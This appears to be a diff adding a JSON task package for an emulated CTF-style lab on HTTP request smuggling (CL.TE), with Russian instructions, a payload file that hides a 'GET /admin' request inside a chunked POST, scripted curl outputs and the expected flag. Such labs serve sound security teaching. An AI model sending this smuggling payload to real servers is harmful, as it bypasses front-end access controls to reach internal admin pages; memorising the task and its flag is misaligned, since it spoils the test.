@@ -1,0 +1,38 @@
+{
+  "id": "web-request-smuggling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{cl_te_smuggl3s_p4st_th3_w4f}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: HTTP Request Smuggling (CL.TE)\n\n`shop.local` стоит за фронтендом (nginx), который пересылает запросы бэкенду.\nФронтенд верит `Content-Length`, бэкенд — `Transfer-Encoding: chunked`. Спрячь\nвторой запрос в теле первого — фронтенд его не увидит, а бэкенд выполнит.\n\n1. Обычный запрос:\n   curl -s 'http://shop.local/'\n2. В каталоге лежит `payload.txt` — заготовка smuggled-запроса. Отправь её:\n   curl -s 'http://shop.local/' --data-binary @payload.txt -H 'Transfer-Encoding: chunked'\n3. Бэкенд обработает «спрятанный» запрос и вернёт флаг.\n4. Флаг — последняя строка ответа. Запиши в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/payload.txt",
+      "text": "POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.shop.local\r\n\r\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "payload\\.txt|transfer-encoding",
+          "example": "-s 'http://shop.local/' --data-binary @payload.txt -H 'Transfer-Encoding: chunked'",
+          "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nadmin-note: nto{cl_te_smuggl3s_p4st_th3_w4f}\n"
+        },
+        {
+          "match": "shop\\.local",
+          "example": "-s 'http://shop.local/'",
+          "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/.\n"
+    }
+  }
+}
